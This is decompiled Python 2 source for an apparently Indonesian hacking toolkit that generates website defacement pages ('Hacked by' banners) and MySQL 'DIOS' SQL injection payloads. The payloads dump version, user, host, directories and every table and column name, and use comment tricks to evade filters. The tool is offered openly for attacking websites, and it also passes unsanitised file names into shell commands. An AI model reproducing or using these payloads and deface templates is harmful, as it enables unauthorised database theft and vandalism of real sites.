# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:47:43) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
from os import system
from time import sleep
k = '\x1b[93m'
n = '\x1b[0m'

def depes():
    try:
        mess = '\n\x1b[92m\n\t======================================================\x1b[91m\n         \t\tdeveloped by Mr.ZOMBY\x1b[97m\n         \t\tTeam : Zone-Exploiter\x1b[93m\n         \t\tScript Deface Creator\x1b[92m\n\t======================================================\x1b[0m'
        system('clear')
        print mess
        judul = raw_input('\nmasukan judul: ')
        text = raw_input('Hacked by? : ')
        gambar = raw_input('masukan gambar link gambar: ')
        text2 = raw_input('masukan pesan anda <br> untuk enter: ')
        tank = raw_input('Thanks To?: ')
        edan = raw_input('nama file html? : ')
        wongedan = open(edan, 'w')
        mr1 = '\n\t\t<html>\n\t\t<head>\n\t\t<title>'
        mr2 = judul
        mr3 = '\n\t\t</title>\n\t\t<style>\n\t\t#bg\n\t\t{\n\t\t\tbackground: black;\n\t\t}\n\t\t</style>\n\t\t</head>\n\t\t<body>\n\t\t<body bgcolor id="bg">\n\t\t<center>\n\t\t<font color="lime" size="10" face="courier new">'
        mr4 = text
        mr5 = '</font>\n\t\t<br><br>\n\t\t<link type="text/css" href="http://anicrack-indo.netii.net/error.css" rel="stylesheet">\n\t\t<div class="error">\n\t\t<img style="width: 200px" src="'
        mr6 = gambar
        mr7 = '">\n\t\t</div>\n\t\t<br>\n\t\t<font color="lime" size="5" face="courier new">'
        mr8 = text2
        mr9 = '</font>\n\t\t<br>\n\t\t<br>\n\t\t<footer>\n\t\t<table style="border:1px;border-color:blue;border-style:double;padding-left:2px;padding-right:2px;bottom:2px;height:25px;width:100%;">\n\t\t<tr>\n\t\t<td style="border: 1px;width:10%; background: transparent;box-shadow: 0px 0px 8px green;\n\t\tbottom: 2px; border-color:green; border-style: dotted";>\n\t\t<center>\n\t\t<font style="color:skyblue;direction:center;font-family:electrolize;font-size:20px;text-shadow:0px 0px 5px Sms;">thanks to All:</font></center>\n\t\t</td>\n\t\t<td><marquee class="z"style="color:skyblue; font-size:20px;font-family:electrolize;text-shadow: 0px 0px 5px aqua; direction:left;"scrollamount="5px">'
        mr10 = tank + '</marquee>'
        mr11 = '</td></tr>\n\t\t</table>\n\t\t</footer>\n\t\t</center>\n\t\t</body>\n\t\t</html>'
        wongedan.write(mr1)
        wongedan.write(mr2)
        wongedan.write(mr3)
        wongedan.write(mr4)
        wongedan.write(mr5)
        wongedan.write(mr6)
        wongedan.write(mr7)
        wongedan.write(mr8)
        wongedan.write(mr9)
        wongedan.write(mr10)
        wongedan.write(mr11)
        wongedan.close()
        system('mv ' + edan + ' /storage/emulated/0')
        system('clear')
        sleep(1)
        print '\npembuatan script telah selasai\nsilahkan cek dimemory internal..\n'
        pilih()
    except:
        pilih()


def dios():
    w = 'concat(0x'
    z = 'concat(0x'
    gambar = '3c696d67207372633d'
    gambar2 = '77696474683d3330303e'
    w2 = ',0x3c666f6e7420636f6c6f723d72656420666163653d636f7572696572206e65772073697a653d343e'
    br = ',0x3c62723e'
    dios1 = ',0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version/**_**/(),0x3C62723E,0x4461746162617365203A3A20,database/**_**/(),0x3c62723e44617461626173652055736572203a3a20,user/**_**/(),0x3c62723e,0x486F73746E616D65203A3A20,@@hostname,0x3C62723E,0x506F7274203A3A20,@@port,0x3C62723E,0x53796D6C696E6B203A3A20,@@GLOBAL.have_symlink,0x3C62723E,0x546D7020646972203A3A20,@@tmpdir,0x3C62723E,0x4261736520646972203A3A20,@@basedir,0x3C62723E,0x4461746120646972203A3A20,@@datadir,0x3C62723E,0x53534C203A3A20,@@GLOBAL.have_ssl,0x3C62723E,0x55554944203A3A20,UUID(),0x3C62723E,0x4F73203A3A20,@@version_compile_os,0x3c62723e,0x54697065203A3A20,@@version_compile_machine,0x3c62723e,(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(table_schema=database())and(@:=concat(@,0x3c62723e,0x3C666F6E7420636F6C6F723D677265656E2073697A653D333E,table_name,0x3C2F666F6E743E20,0x203A3A20,0x3C666F6E7420636F6C6F723D626C75652073697A653D333E,column_name))),@))))'
    dios2 = ',0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version/**_**/(),0x3C62723E,0x4461746162617365203A3A20,database/**_**/(),0x3c62723e44617461626173652055736572203a3a20,user/**_**/(),export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2))'
    baner = n + '\n\t\t[+]==============================[+]\n\t\t |   \t\x1b[93mCoded by Mr.ZOMBY\x1b[0m      |\n\t\t |   \t\x1b[93mDios Sqli Creator\x1b[0m         |\n\t\t |   \t\x1b[93mTeam: Zone-Xploiter\x1b[0m       |\n\t\t |   \t\x1b[93mCP  : +628811664850\x1b[0m       |\n\t\t[+]==============================[+]\n\t\t\n\n[1].dios by _w0n63d4n_ (easy and medium web)\n[2].dios by Zx7 (medium and hard web)\n[3].keluar tools'
    system('clear')
    print baner
    sayang = raw_input(k + '\nmasukan pilihan >\x1b[92m ')
    if sayang == '1':
        try:
            cek = raw_input(k + 'masukan url gmbr dlm hex >\x1b[92m ')
            nama = raw_input(k + 'masukan namamu dlm hex >\x1b[92m ')
            nf = raw_input(k + 'nama file diosmu >\x1b[92m ')
            wongedan = w + gambar + cek + gambar2 + br + ',0x' + nama + dios1
            fil = open(nf, 'w')
            fil.write('#jangan lupa kasih bintang digithub saya :v \n\n')
            fil.write(wongedan)
            fil.close()
            system('mv ' + nf + ' /storage/emulated/0')
            system('clear')
            sleep(1.5)
            print k + '\nDios selesai di buat dengan nama file ' + nf + ' silahkan cek di internal..'
            raise SystemExit()
        except KeyboardInterrupt:
            pilih()

    if sayang == '2':
        try:
            cek = raw_input(k + 'masukan url gmbr dlm hex >\x1b[92m ')
            nama = raw_input(k + 'masukan namamu dlm hex >\x1b[92m ')
            nf = raw_input(k + 'nama file diosmu >\x1b[92m ')
            zx7 = z + gambar + cek + gambar2 + br + ',0x' + nama + dios2
            fil = open(nf, 'w')
            fil.write('#jangan lupa kasih bintang digithub saya :v \n\n')
            fil.write(zx7)
            fil.close()
            system('mv ' + nf + ' /storage/emulated/0')
            system('clear')
            sleep(1.5)
            print k + '\nDios selesai di buat dengan nama file ' + nf + ' silahkan cek di internal..'
            raise SystemExit()
        except KeyboardInterrupt:
            pilih()

    if sayang == '3':
        sleep(1)
        raise SystemExit('\njangan lupa mampir lagi :v')
